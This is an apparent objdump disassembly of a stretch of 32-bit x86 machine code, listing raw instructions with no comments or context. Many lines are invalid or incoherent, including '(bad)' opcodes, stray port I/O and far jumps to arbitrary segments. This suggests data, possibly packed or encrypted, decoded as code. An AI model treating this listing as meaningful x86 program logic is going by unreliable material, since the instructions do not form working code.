  419e9b:	ret    0x7c44
  419e9e:	pushf  
  419e9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ea0:	cmp    al,0x42
  419ea2:	test   al,0xe1
  419ea4:	sub    ecx,ebx
  419ea6:	out    0x86,eax
  419ea8:	popa   
  419ea9:	les    eax,FWORD PTR [edi+0x31]
  419eac:	ret    
  419ead:	mov    BYTE PTR [ebp+0x528830f6],0x6d
  419eb4:	mov    cl,0x7
  419eb6:	outs   dx,DWORD PTR ds:[esi]
  419eb7:	or     BYTE PTR [edx-0x80],bh
  419eba:	imul   esi,edi,0xffffffff
  419ebd:	out    0xa4,eax
  419ebf:	adc    edx,DWORD PTR [edi]
  419ec1:	scas   eax,DWORD PTR es:[edi]
  419ec2:	add    al,BYTE PTR [ecx]
  419ec4:	pushf  
  419ec5:	cmp    esp,DWORD PTR [eax+0x12]
  419ec8:	pop    edx
  419ec9:	adc    BYTE PTR [eax-0x28a7a346],0x9f
  419ed0:	ds cmp al,0x1c
  419ed3:	dec    ebx
  419ed4:	push   edx
  419ed5:	ds or  al,0xba
  419ed8:	cmp    dh,BYTE PTR [ecx-0x41]
  419edb:	inc    eax
  419edc:	neg    WORD PTR [esi-0x1e]
  419ee0:	push   esi
  419ee1:	mov    ebp,0x3c9ce46e
  419ee6:	pop    ebp
  419ee7:	pushf  
  419ee8:	inc    edi
  419ee9:	test   al,0x1b
  419eeb:	ins    BYTE PTR es:[edi],dx
  419eec:	popf   
  419eed:	mov    ss:0x33a87879,al
  419ef3:	(bad)  
  419ef4:	fiadd  DWORD PTR ds:0xe8556cd2
  419efa:	aas    
  419efb:	jle    0x419eb3
  419efd:	pop    esi
  419efe:	mov    ebp,0x51b0defe
  419f03:	sub    dh,BYTE PTR [esi+0x5c]
  419f06:	cld    
  419f07:	xchg   ebp,eax
  419f08:	jmp    0x419ee3
  419f0a:	(bad)  
  419f0b:	add    eax,0x79b7b4ad
  419f10:	ja     0x419f0a
  419f12:	in     al,0x40
  419f14:	imul   esp,DWORD PTR ds:0xa80baaed,0x2f1212c7
  419f1e:	cli    
  419f1f:	mov    ebp,0xa1f108ab
  419f24:	loop   0x419ed3
  419f26:	loopne 0x419f9a
  419f28:	data16 or ch,cl
  419f2b:	add    eax,0x66b9d979
  419f30:	push   ecx
  419f31:	inc    edi
  419f32:	dec    eax
  419f33:	add    BYTE PTR [esp+ebx*2],dh
  419f36:	ds (bad) 
  419f38:	scas   eax,DWORD PTR es:[edi]
  419f39:	dec    esi
  419f3a:	pop    es
  419f3b:	popf   
  419f3c:	jp     0x419f29
  419f3e:	shl    DWORD PTR [ebx+0x74],0x48
  419f42:	pop    eax
  419f43:	mov    dh,0x3c
  419f45:	jmp    0xdf09:0xd380000a
  419f4c:	xor    ecx,DWORD PTR [ebx]
  419f4e:	adc    al,0x76
  419f50:	retf   0xcd48
  419f53:	repz mov ah,0xb4
  419f56:	test   eax,0x57542aa8
  419f5b:	test   al,0x87
  419f5d:	sub    DWORD PTR [esi+ecx*4-0x3c197f81],ebx
  419f64:	push   ds
  419f65:	mov    esp,0x83f9c094
  419f6a:	mov    WORD PTR [ecx+0x42],gs
  419f6d:	adc    esp,DWORD PTR [ebx]
  419f6f:	stc    
  419f70:	loopne 0x419f3e
  419f72:	adc    eax,0x90aa6254
  419f77:	lods   al,BYTE PTR ds:[esi]
  419f78:	cmp    edi,ecx
  419f7a:	inc    ebx
  419f7b:	and    bh,0x88
  419f7e:	jecxz  0x419fe3
  419f80:	addr16 pusha 
  419f82:	mov    eax,0x713978b1
  419f87:	jge    0x419fcb
  419f89:	rcl    DWORD PTR [esi],cl
  419f8b:	mov    dl,0x1e
  419f8d:	push   ebp
  419f8e:	dec    eax
  419f8f:	pop    edx
  419f90:	xor    DWORD PTR [ecx-0x7ade9193],esi
  419f96:	scas   eax,DWORD PTR es:[edi]
  419f97:	in     al,dx
  419f98:	hlt    
  419f99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f9a:	cmp    al,0x44
  419f9c:	and    esp,edi
  419f9e:	popa   
  419f9f:	add    DWORD PTR [edx+eax*1-0x4a],esp
  419fa3:	loope  0x419fe2
  419fa5:	gs pop ss
  419fa7:	jge    0x419fe3
  419fa9:	aam    0x60
  419fab:	pop    eax
  419fac:	and    BYTE PTR [edi-0x6cf7e6b2],cl
  419fb2:	das    
  419fb3:	cmp    al,0xb0
  419fb5:	mov    ch,0x8f
  419fb7:	popa   
  419fb8:	sbb    DWORD PTR [edx-0x6e],ecx
  419fbb:	jge    0x419f85
  419fbd:	pop    ss
  419fbe:	pop    es
  419fbf:	(bad)  
  419fc0:	push   edi
  419fc1:	inc    ecx
  419fc2:	jb     0xdad0264
  419fc8:	lds    ecx,FWORD PTR [edx]
  419fca:	jo     0x419f67
  419fcc:	out    0xab,eax
  419fce:	out    dx,eax
  419fcf:	inc    edx
  419fd0:	retf   0xe7fc
  419fd3:	xchg   esi,eax
  419fd4:	pop    ss
  419fd5:	pop    ss
  419fd6:	retf   
  419fd7:	out    0x59,al
  419fd9:	jl     0x41a052
  419fdb:	dec    ebx
  419fdc:	ins    BYTE PTR es:[edi],dx
  419fdd:	retf   
  419fde:	mov    ebx,0xbe5707a5
  419fe3:	mov    esp,DWORD PTR [eax+0x7e]
  419fe6:	ss cdq 
  419fe8:	pop    ds
  419fe9:	int    0x33
  419feb:	cdq    
  419fec:	mov    ebx,0x3bc7a31b
  419ff1:	and    dh,bh
  419ff3:	out    dx,eax
  419ff4:	adc    eax,0xd4d7f52f
  419ff9:	jne    0x419ff5
  419ffb:	jecxz  0x419fc9
  419ffd:	inc    ebx
  419fff:	fiadd  DWORD PTR [edi+0x1e]
  41a002:	jmp    0x41a02f
  41a004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a005:	scas   eax,DWORD PTR es:[edi]
  41a006:	add    bh,ch
  41a008:	fld    QWORD PTR [ebp-0x2f1238bd]
  41a00e:	cld    
  41a00f:	push   edi
  41a010:	gs dec esi
  41a013:	nop
  41a014:	jns    0x419ff7
  41a016:	sbb    BYTE PTR [eax],cl
  41a018:	in     al,0xce
  41a01a:	mov    edi,0x86c43216
  41a01f:	jnp    0x41a02e
  41a021:	adc    dl,ah
  41a023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a025:	and    bl,BYTE PTR [ecx+0x5e]
  41a028:	pop    edx
  41a029:	jl     0x419fda
  41a02b:	mov    eax,0xfb71bdc9
  41a030:	dec    edx
  41a031:	fld    DWORD PTR [esi-0x5f]
  41a034:	jge    0x41a066
  41a036:	pop    ebp
  41a037:	pushf  
  41a038:	mov    al,ds:0x1b38a11f
  41a03d:	jbe    0x41a07d
  41a03f:	sbb    al,BYTE PTR [eiz*2-0xc185e36]
  41a046:	fwait
  41a047:	push   ds
  41a048:	stc    
  41a049:	or     BYTE PTR [eax+0x38],dl
  41a04c:	mov    ch,0x93
  41a04e:	test   eax,0x9a3edda4
  41a053:	inc    esi
  41a054:	inc    DWORD PTR [ebx-0x36]
  41a057:	xchg   ebp,eax
  41a058:	cmp    bl,dl
  41a05a:	popf   
  41a05b:	inc    ebx
  41a05c:	add    ebp,ebp
  41a05e:	cmp    DWORD PTR [ebp-0x59],eax
  41a061:	cmc    
  41a062:	sbb    dh,ch
  41a064:	sub    eax,0x6939ee8
  41a069:	jae    0x41a0d3
  41a06b:	mov    ds:0x4ee98605,al
  41a070:	int3   
  41a071:	loope  0x41a042
  41a073:	mov    al,0x3c
  41a075:	mov    esp,0xc1b689c0
  41a07a:	fs call 0xd3b7cc52
  41a080:	int3   
  41a081:	enter  0xcd9c,0x2c
  41a085:	loope  0x41a0e4
  41a087:	into   
  41a088:	inc    edx
  41a089:	in     eax,0x38
  41a08b:	jecxz  0x41a042
  41a08d:	cmc    
  41a08e:	test   eax,0xa1e5d475
  41a093:	stos   DWORD PTR es:[edi],eax
  41a094:	pmulhw mm7,QWORD PTR [ecx]
  41a097:	popf   
  41a098:	cmp    ebp,DWORD PTR ds:0xa312ef57
  41a09e:	xor    eax,0x665af66f
  41a0a3:	js     0x41a0a6
  41a0a5:	iret   
  41a0a6:	aam    0xa5
  41a0a8:	push   es
  41a0a9:	cmp    eax,0x1e53638b
  41a0ae:	retf   0xca06
  41a0b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0b2:	fld    TBYTE PTR [ebp+0x3baa7c21]
  41a0b8:	data16 sar BYTE PTR [edi],1
  41a0bb:	jb     0x41a067
  41a0bd:	in     al,dx
  41a0be:	test   al,0xb
  41a0c0:	push   edi
  41a0c1:	(bad)  
  41a0c2:	aaa    
  41a0c3:	jns    0x41a04f
  41a0c5:	sub    eax,DWORD PTR ds:0x14be22cf
  41a0cb:	add    edx,DWORD PTR [ebx]
  41a0cd:	and    eax,0xed958c1c
  41a0d2:	adc    DWORD PTR [edx-0x629cad85],ebp
  41a0d8:	push   es
  41a0d9:	sbb    eax,DWORD PTR [ebx+ecx*2-0x57]
  41a0dd:	les    esp,FWORD PTR [eax]
  41a0df:	xchg   BYTE PTR [esp+edx*4-0x6d],al
  41a0e3:	jb     0x41a127
  41a0e5:	mov    ah,0xeb
  41a0e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0e8:	push   es
  41a0e9:	mov    cl,BYTE PTR [ecx-0x6]
  41a0ec:	push   ebx
  41a0ed:	stos   BYTE PTR es:[edi],al
  41a0ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0ef:	jno    0x41a0a7
  41a0f1:	cwde   
  41a0f2:	push   eax
  41a0f3:	loop   0x41a08f
  41a0f5:	out    0xb5,al
  41a0f7:	icebp  
  41a0f8:	(bad)  
  41a0f9:	mov    ds,WORD PTR [ebp+0x611b2e86]
  41a0ff:	mov    esi,0x728e5159
  41a104:	hlt    
  41a105:	mov    dh,BYTE PTR [edi+edx*1-0x73561e16]
  41a10c:	out    dx,al
  41a10d:	cmp    al,0x41
  41a10f:	jns    0x41a0d3
  41a111:	shl    DWORD PTR [esi+edi*2],1
  41a114:	and    BYTE PTR [esi],bl
  41a116:	loope  0x41a178
  41a118:	push   0xfffffff7
  41a11a:	inc    edi
  41a11b:	cmc    
  41a11c:	mov    dh,0x8f
  41a11e:	add    BYTE PTR [ebx-0x5],0x3c
  41a122:	cld    
  41a123:	jne    0x41a0b9
  41a125:	sbb    BYTE PTR [edx],cl
  41a127:	sub    esp,0x4de8ebfe
  41a12d:	pop    ecx
  41a12e:	ret    
  41a12f:	iret   
  41a130:	sub    BYTE PTR [esi],bl
  41a132:	sub    al,0x9
  41a134:	mov    esp,ss
  41a136:	mov    esi,0x55a32812
  41a13b:	shr    DWORD PTR [esi+0x42e0450d],0x20
  41a142:	mov    ah,0xa6
  41a144:	repnz jmp 0x90f2:0x1b7230e3
  41a14c:	stos   BYTE PTR es:[edi],al
  41a14d:	mov    eax,0x11b9040e
  41a152:	add    al,0xc8
  41a154:	inc    ebx
  41a155:	mov    ch,0x3e
  41a157:	mov    edx,0xc6f48645
  41a15c:	shl    ebx,1
  41a15e:	adc    eax,0xbbf95b44
  41a163:	jmp    0x25b6d4e
  41a168:	fs mov esi,0x2065a354
  41a16e:	js     0x41a0fc
  41a170:	addr16 out 0x81,eax
  41a173:	xor    eax,0x5ec7cd5a
  41a178:	push   0x23d2832e
  41a17d:	jl     0x41a1fe
  41a17f:	pop    ds
  41a180:	sub    BYTE PTR [bx+di],al
  41a183:	int    0x2
  41a185:	mov    ah,BYTE PTR [esi-0x21]
  41a188:	lahf   
  41a189:	nop
  41a18a:	sub    eax,0x7f7cfba1
  41a18f:	in     eax,0xd2
  41a191:	retf   
  41a192:	lds    ebx,FWORD PTR [eax]
  41a194:	push   ebx
  41a195:	ds mov esi,0xba140b49
  41a19b:	sbb    dh,al
  41a19d:	adc    DWORD PTR [ebx],esi
  41a19f:	sub    dh,BYTE PTR [esi]
  41a1a1:	sub    BYTE PTR [eax+0x23],dl
  41a1a4:	push   ebx
  41a1a5:	pop    edi
  41a1a6:	mov    ch,0xcf
  41a1a8:	jg     0x41a141
  41a1aa:	and    edx,DWORD PTR [eax+0x43]
  41a1ad:	in     al,dx
  41a1ae:	jl     0x41a13b
  41a1b0:	imul   ebp,DWORD PTR [ecx+eiz*1-0x51],0x7fde5d74
  41a1b8:	mov    edx,0x4dab67e3
  41a1bd:	jp     0x41a1f3
  41a1bf:	gs push esp
  41a1c1:	push   edx
  41a1c2:	mov    bl,0xf0
  41a1c4:	test   BYTE PTR [ecx+0x27],0x81
  41a1c8:	dec    edi
  41a1c9:	sub    BYTE PTR [esi-0x28fa432],dh
  41a1cf:	loopne 0x41a227
  41a1d1:	dec    esi
  41a1d2:	js     0x41a242
  41a1d4:	shl    DWORD PTR [esi-0x36],0x70
  41a1d8:	push   0xafbc110
  41a1dd:	repnz push 0xe0833094
  41a1e3:	cdq    
  41a1e4:	mov    esi,0x7298aa82
  41a1e9:	test   DWORD PTR [esi+0x32815c7],ecx
  41a1ef:	jg     0x41a1f9
  41a1f1:	call   0xe0f6:0x4522aa3f
  41a1f8:	mov    ds:0x5c7da888,eax
  41a1fd:	mov    ah,0x78
  41a1ff:	pop    ebx
  41a200:	lahf   
  41a201:	add    ebp,DWORD PTR [ecx-0xa]
  41a204:	cs adc eax,0xdc52d4db
  41a20a:	sbb    bl,BYTE PTR [ecx+0x7c]
  41a20d:	pop    eax
  41a20e:	ja     0x41a27e
  41a210:	dec    esi
  41a211:	pop    ecx
  41a212:	mov    eax,0x76e85bb5
  41a217:	mov    bl,0x6a
  41a219:	popa   
  41a21a:	inc    esi
  41a21b:	mov    bh,0x2
  41a21d:	mov    cl,0x78
  41a21f:	push   eax
  41a220:	pop    ecx
  41a221:	adc    DWORD PTR es:[esi+0x2ee269f6],0xdf4e6fd0
  41a22c:	xchg   edx,eax
  41a22d:	mov    edx,0x561beb21
  41a232:	jg     0x41a269
  41a234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  41a241:	scas   al,BYTE PTR es:[edi]
  41a242:	add    ebx,ebp
  41a244:	mov    ds:0xdeeebef,eax
  41a249:	mov    ebp,DWORD PTR [edi]
  41a24b:	ins    BYTE PTR es:[edi],dx
  41a24c:	adc    edi,esi
  41a24e:	dec    esp
  41a24f:	jae    0x41a280
  41a251:	adc    DWORD PTR [eax],esp
  41a253:	add    DWORD PTR [eax],eax
  41a255:	lods   al,BYTE PTR ds:[esi]
  41a256:	add    eax,DWORD PTR [eax]
  41a258:	add    BYTE PTR [ecx+0xd],ch
  41a25b:	jl     0x41a23b
  41a25d:	inc    esi
  41a25e:	inc    eax
  41a25f:	clc    
  41a260:	rol    BYTE PTR [ebp+eiz*8-0x5457bf8a],cl
  41a267:	xchg   edx,eax
  41a268:	pop    ecx
  41a269:	adc    al,0x97
  41a26c:	xor    DWORD PTR [edi+0x43],ebx
  41a26f:	mov    ds:0x6c317f32,al
  41a274:	cdq    
  41a275:	pop    ds
  41a276:	out    dx,al
  41a277:	das    
  41a278:	imul   ecx,edx,0xabaeda9d
  41a27e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a27f:	sub    eax,0x5bb1e19
  41a284:	xchg   esi,eax
  41a285:	inc    ebp
  41a286:	dec    ebp
  41a287:	mov    ah,0x28
  41a289:	(bad)  
  41a28a:	aad    0xca
  41a28c:	mov    esp,edx
  41a28e:	mov    ds:0x11a45b6f,al
  41a293:	mov    cl,0xfe
  41a295:	push   edi
  41a296:	fwait
  41a297:	fs and eax,0x9697a2c6
  41a29d:	outs   dx,BYTE PTR ds:[esi]
  41a29e:	fldcw  WORD PTR [ebp-0x3e0cccfe]
  41a2a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2a5:	aam    0x8f
  41a2a7:	jg     0x41a284
  41a2a9:	mov    ds:0x94865b14,al
  41a2ae:	aad    0x1d
  41a2b0:	xchg   ecx,eax
  41a2b1:	and    eax,DWORD PTR [ebx+0x7c]
  41a2b4:	jae    0x41a2a2
  41a2b6:	in     al,0x6a
  41a2b8:	sbb    ecx,DWORD PTR [edi]
  41a2ba:	cmp    al,BYTE PTR ds:0x4bf34063
  41a2c0:	pop    esi
  41a2c1:	xchg   BYTE PTR [edi-0x6f],al
  41a2c4:	jmp    0x95ffae63
  41a2c9:	and    ebp,DWORD PTR [edx-0x4a]
  41a2cc:	push   esp
  41a2cd:	mov    DWORD PTR [ecx-0x3b41e07f],esi
  41a2d3:	and    al,0x66
  41a2d5:	xor    ecx,eax
  41a2d7:	push   0x5383c71d
  41a2dc:	enter  0xbf9e,0x4
  41a2e0:	mov    fs,WORD PTR [esi]
  41a2e2:	icebp  
  41a2e3:	or     BYTE PTR [eax-0x2d],cl
  41a2e6:	(bad)  
  41a2e7:	cmp    dl,BYTE PTR [esi]
  41a2e9:	dec    esi
  41a2ea:	pop    es
  41a2eb:	jp     0x41a2c8
  41a2ed:	jbe    0x41a2f5
  41a2ef:	and    ebp,ebx
  41a2f1:	mov    bh,0x4b
  41a2f3:	xchg   ecx,eax
  41a2f4:	ret    0xd1c8
  41a2f7:	int    0x69
  41a2f9:	cmp    al,0x11
  41a2fb:	lods   al,BYTE PTR ds:[esi]
  41a2fc:	fsubp  st(6),st
  41a2fe:	adc    eax,0x2301c1b1
  41a303:	adc    eax,0xb49861c1
  41a308:	or     BYTE PTR [eax+0x4cd38215],ah
  41a30e:	cwde   
  41a30f:	jno    0x41a2ac
  41a311:	and    eax,0xf1256494
  41a316:	scas   eax,DWORD PTR es:[edi]
  41a317:	jmp    0xa893:0xb5b075f
  41a31e:	add    cl,BYTE PTR fs:[ebx]
  41a321:	dec    eax
  41a322:	out    0x5e,eax
  41a324:	dec    esi
  41a325:	dec    ebp
  41a326:	(bad)  
  41a327:	int    0x59
  41a329:	int    0x99
  41a32b:	jg     0x41a2b8
  41a32d:	lods   eax,DWORD PTR ds:[esi]
  41a32e:	pushf  
  41a32f:	push   esp
  41a330:	int    0xc8
  41a332:	shl    esi,0x85
  41a335:	cmp    BYTE PTR [edi+0x2ce6c7b2],dh
  41a33b:	enter  0xb1fa,0x54
  41a33f:	sub    esp,DWORD PTR [ebx+ecx*2+0x23]
  41a343:	pop    esp
  41a344:	fild   WORD PTR [eax]
  41a346:	xchg   edx,eax
  41a347:	(bad)  [edx]
  41a349:	jbe    0x41a2ec
  41a34b:	mov    al,ds:0xc2cf1e8a
  41a350:	mov    ch,0x3
  41a352:	sbb    bl,BYTE PTR [edi+0x46b3b349]
  41a358:	addr16 rol edx,1
  41a35b:	dec    edx
  41a35c:	aas    
  41a35d:	jg     0x41a348
  41a35f:	lock inc ebp
  41a361:	lahf   
  41a362:	lock pop ebp
  41a364:	je     0x41a3ac
  41a366:	add    eax,0xec5242aa
  41a36b:	adc    eax,0xa9902c18
  41a370:	adc    al,0x1e
  41a372:	pop    ebp
  41a373:	dec    ecx
  41a374:	dec    edx
  41a375:	and    DWORD PTR [eax],0x5b
  41a378:	aam    0x66
  41a37a:	int3   
  41a37b:	rol    ebp,0xe8
  41a37e:	jns    0x41a33f
  41a380:	xor    al,0x22
  41a382:	loopne 0x41a349
  41a384:	out    0xf7,eax
  41a386:	fnstsw WORD PTR [esi]
  41a388:	lds    ebp,FWORD PTR [ebx]
  41a38a:	and    ch,bh
  41a38c:	fs (bad) 
  41a38e:	js     0x41a31e
  41a390:	loope  0x41a383
  41a392:	into   
  41a393:	dec    edx
  41a394:	je     0x41a361
  41a396:	add    al,bh
  41a398:	pop    ebx
  41a399:	inc    edi
  41a39a:	dec    edx
  41a39b:	out    dx,eax
  41a39c:	add    eax,0xf52e97d9
  41a3a1:	xchg   DWORD PTR [esi-0x3851b431],ecx
  41a3a7:	sahf   
  41a3a8:	or     DWORD PTR [ecx],ebp
  41a3aa:	stos   DWORD PTR es:[edi],eax
  41a3ab:	push   ebp
  41a3ac:	test   edi,0x19f0e03a
  41a3b2:	(bad)  
  41a3b3:	int    0x7
  41a3b5:	xchg   BYTE PTR [eax],al
  41a3b7:	icebp  
  41a3b8:	int3   
  41a3b9:	sub    DWORD PTR [ebx],esp
  41a3bb:	ror    BYTE PTR [ecx-0x75],0x87
  41a3bf:	xor    eax,0xf8a18b60
  41a3c4:	rcl    DWORD PTR [esi+eiz*4],1
  41a3c7:	xor    ebp,DWORD PTR [edx+0x33059f1c]
  41a3cd:	aad    0x91
  41a3cf:	sub    al,0x47
  41a3d1:	cmp    al,0xfa
  41a3d3:	pop    esi
  41a3d4:	hlt    
  41a3d5:	mov    al,0x7b
  41a3d7:	(bad)  
  41a3d8:	fsubr  DWORD PTR [esi-0x58e7dcdf]
  41a3de:	std    
  41a3df:	mov    edi,0xda454a07
  41a3e4:	iret   
  41a3e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3e6:	push   cs
  41a3e7:	sub    DWORD PTR [edi-0x5d7da5ab],esp
  41a3ed:	mov    ch,0x59
  41a3ef:	outs   dx,DWORD PTR ds:[esi]
  41a3f0:	inc    esi
  41a3f1:	push   ebp
  41a3f2:	dec    esi
  41a3f3:	test   eax,0x90df434b
  41a3f8:	aaa    
  41a3f9:	or     BYTE PTR [esi+0x4b3ed0f2],0x36
  41a400:	dec    ebp
  41a401:	jge    0x41a3bb
  41a403:	xor    esp,DWORD PTR ds:0x18000d83
  41a409:	mov    dh,0xd8
  41a40b:	inc    ebx
  41a40c:	inc    edx
  41a40d:	pop    esp
  41a40e:	xchg   esi,eax
  41a40f:	(bad)  
  41a411:	es (bad) 
  41a413:	out    0x9a,al
  41a415:	scas   al,BYTE PTR es:[edi]
  41a416:	cdq    
  41a417:	push   eax
  41a418:	call   0xce2ec983
  41a41d:	aam    0xfe
  41a41f:	sbb    esi,DWORD PTR [ebp+eax*4+0x5de9ce7f]
  41a426:	mov    dl,0xc3
  41a428:	lahf   
  41a429:	sbb    esp,DWORD PTR ds:0x7a384153
  41a42f:	ds lock (bad) 
  41a433:	pop    es
  41a434:	ins    BYTE PTR es:[edi],dx
  41a435:	dec    esi
  41a436:	xchg   edi,eax
  41a437:	jne    0x41a4b6
  41a439:	sar    BYTE PTR [eax+0x3b],1
  41a43c:	cs pop esi
  41a43e:	inc    edi
  41a43f:	cmp    BYTE PTR [ecx],dh
  41a441:	cmp    BYTE PTR [edx],dh
  41a443:	cmp    DWORD PTR [eax],edx
  41a445:	hlt    
  41a446:	(bad)  
  41a447:	xchg   ebp,eax
  41a448:	fs pop ebp
  41a44a:	in     eax,dx
  41a44b:	sbb    ch,al
  41a44d:	leave  
  41a44e:	dec    eax
  41a44f:	push   eax
  41a450:	sub    dl,ch
  41a452:	retf   
  41a453:	pushf  
  41a454:	inc    ebx
  41a455:	dec    ecx
  41a456:	add    edi,DWORD PTR [ecx+0x7613d1cc]
  41a45c:	sbb    bh,BYTE PTR ds:0x5ea02d5e
  41a462:	sbb    eax,0xefb3478
  41a467:	jb     0x41a48b
  41a469:	stc    
  41a46a:	(bad)  [edi+edx*1-0x296677b7]
  41a471:	je     0x41a4c0
  41a473:	push   edx
  41a474:	xchg   ebp,eax
  41a475:	test   eax,0x7f00f40f
  41a47a:	leave  
  41a47b:	imul   eax,ebp,0x5a414b9b
  41a481:	not    ah
  41a483:	aas    
  41a484:	cld    
  41a485:	mov    dh,bh
  41a487:	or     al,0x84
  41a489:	xchg   BYTE PTR [edx-0x37be3971],al
  41a48f:	imul   esp,DWORD PTR [ecx-0x1486e75c],0x45
  41a496:	mov    al,0xea
  41a498:	push   0x528180f1
  41a49d:	bound  edi,QWORD PTR [edi]
  41a49f:	jae    0x41a436
  41a4a1:	dec    esi
  41a4a2:	mov    dh,0x19
  41a4a4:	es fucomip st,st(4)
  41a4a7:	in     al,dx
  41a4a8:	cwde   
  41a4a9:	ja     0x41a4b9
  41a4ab:	stos   BYTE PTR es:[edi],al
  41a4ac:	fdivr  QWORD PTR [eax-0x51]
  41a4af:	lods   eax,DWORD PTR ds:[esi]
  41a4b0:	cmp    bh,dl
  41a4b2:	cwde   
  41a4b3:	xlat   BYTE PTR ds:[ebx]
  41a4b4:	inc    ecx
  41a4b5:	fwait
  41a4b6:	cmp    eax,0x27e08312
  41a4bb:	lods   eax,DWORD PTR ds:[esi]
  41a4bc:	sbb    eax,0x4ff7fc9c
  41a4c1:	mov    al,ds:0xd37a5678
  41a4c6:	adc    eax,0x62cd82aa
  41a4cb:	out    dx,al
  41a4cc:	arpl   WORD PTR [ebx],cx
  41a4ce:	fcomp  QWORD PTR [edi]
  41a4d0:	or     al,0x44
  41a4d2:	push   ss
  41a4d3:	or     esp,edi
  41a4d5:	mov    esi,0x5e18491d
  41a4da:	lock stc 
  41a4dc:	retf   0xe99c
  41a4df:	xor    ch,al
  41a4e1:	mov    dl,0xb0
  41a4e3:	inc    esi
  41a4e4:	inc    edi
  41a4e5:	xor    DWORD PTR [edx],edi
  41a4e7:	and    ch,BYTE PTR [esi]
  41a4e9:	lea    ebp,[edx]
  41a4eb:	adc    eax,0xcabb6436
  41a4f0:	retf   0xf144
  41a4f3:	push   cs
  41a4f4:	(bad)
  41a4f7:	cmc    
  41a4f8:	hlt    
  41a4f9:	dec    edi
  41a4fa:	jb     0x41a520
  41a4fc:	inc    ebx
  41a4fd:	shr    BYTE PTR [esi],1
  41a4ff:	jns    0x41a4c1
  41a501:	dec    edx
  41a502:	mov    BYTE PTR es:[ebx-0x27],dh
  41a506:	mov    bh,0x22
  41a508:	push   ebx
  41a509:	cmp    esi,DWORD PTR [esi+0x4420ffd]
  41a50f:	push   es
  41a510:	clc    
  41a511:	fwait
  41a512:	das    
  41a513:	aam    0xcf
  41a515:	ins    DWORD PTR es:[edi],dx
  41a516:	dec    edi
  41a517:	mov    BYTE PTR [edi],bh
  41a519:	sub    bl,BYTE PTR [ebp-0x5dd7d341]
  41a51f:	mov    edx,DWORD PTR [ebx]
  41a521:	fistp  QWORD PTR [esi]
  41a523:	fnstsw WORD PTR [edx-0x3a]
  41a526:	call   0xcfa5:0xb412bee6
  41a52d:	add    al,0x39
  41a52f:	add    ebx,DWORD PTR ds:0xc9d7de2a
  41a535:	xchg   BYTE PTR [ebp+0x3b],cl
  41a538:	sub    dl,BYTE PTR cs:[ebp+0x3b6a822]
  41a53f:	out    dx,eax
  41a540:	rcr    DWORD PTR [ebx+0x1e],1
  41a543:	jmp    0x8440:0x99f42f61
  41a54a:	lea    edx,[esi+0x2532b45a]
  41a550:	test   DWORD PTR [edi-0x47ca13c3],esi
  41a556:	cmp    dl,BYTE PTR [edx-0x7c7c908c]
  41a55c:	or     BYTE PTR [ecx-0x4],ch
  41a55f:	mov    bh,0x15
  41a561:	and    BYTE PTR [edi-0x5d0c5eb3],dl
  41a567:	enter  0xd355,0xa
  41a56b:	call   0xb48e:0xe300202e
  41a572:	(bad)
  41a575:	mov    DWORD PTR [ebp+0x59],0xab4ff827
  41a57c:	mov    bl,0xc5
  41a57e:	ja     0x41a588
  41a580:	ret    0xc2b1
  41a583:	mov    ds:0xca6ac43a,al
  41a588:	je     0x41a564
  41a58a:	and    DWORD PTR [ebp+0x7e],ebx
  41a58d:	adc    dl,BYTE PTR ds:0x30a06202
  41a593:	shr    ch,0x3f
  41a596:	leave  
  41a597:	sub    eax,0xab19a954
  41a59c:	stc    
  41a59d:	ins    DWORD PTR es:[edi],dx
  41a59e:	jne    0x41a53b
  41a5a0:	xchg   edi,eax
  41a5a1:	ret    0x4dd6
  41a5a4:	mov    ?,eax
  41a5a6:	xlat   BYTE PTR ds:[ebx]
  41a5a7:	xchg   edx,eax
  41a5a8:	inc    esi
  41a5a9:	sbb    eax,0x7a6c0ec8
  41a5ae:	xchg   ebx,eax
  41a5af:	cli    
  41a5b0:	mov    al,0xc9
  41a5b2:	in     eax,dx
  41a5b3:	fwait
  41a5b4:	sar    DWORD PTR [edx],cl
  41a5b6:	sbb    eax,0x79f6db29
  41a5bb:	xchg   edx,eax
  41a5bc:	loopne 0x41a596
  41a5be:	aaa    
  41a5bf:	cwde   
  41a5c0:	cmp    DWORD PTR [esi+0x61527904],ebx
  41a5c6:	imul   ebx,DWORD PTR [esi+0x5c3ac753],0xa08c4c22
  41a5d0:	test   BYTE PTR [esi],ah
  41a5d2:	adc    BYTE PTR [ebp-0x61c4915f],0x30
  41a5d9:	xlat   BYTE PTR ds:[ebx]
  41a5da:	push   ecx
  41a5db:	imul   ebp,edx,0xc4cbf95
  41a5e1:	sbb    bh,BYTE PTR [ebx-0x4d0b3ded]
  41a5e7:	inc    ecx
  41a5e8:	(bad)  
  41a5e9:	fisttp QWORD PTR [ebx+0x8a0563f]
  41a5ef:	pop    esp
  41a5f0:	mov    DWORD PTR [ecx+0x14],ebp
  41a5f3:	mov    gs,WORD PTR [ebx+0x64d54540]
  41a5f9:	imul   esp,DWORD PTR [ecx-0x26],0xffffffac
  41a5fd:	ins    BYTE PTR es:[edi],dx
  41a5fe:	jle    0x41a634
  41a600:	ror    BYTE PTR [ebp+0xe3a702],1
	...
  41a60e:	add    BYTE PTR [eax],al
  41a610:	add    ah,dl
  41a612:	mov    edi,0xedff8dd6
  41a617:	(bad)  
  41a619:	or     al,0x14
  41a61b:	call   0xbd9a:0x112ab4e
  41a622:	and    eax,DWORD PTR [ecx]
  41a624:	add    BYTE PTR [ebx+eax*1+0x592c0000],ch
  41a62b:	adc    ebx,DWORD PTR [ebx]
  41a62d:	fild   DWORD PTR [ebp+0x600430eb]
  41a633:	(bad)  
  41a634:	in     al,dx
  41a635:	pop    ds
  41a636:	cmp    DWORD PTR ds:0x16f1be67,ecx
  41a63c:	out    0xbc,eax
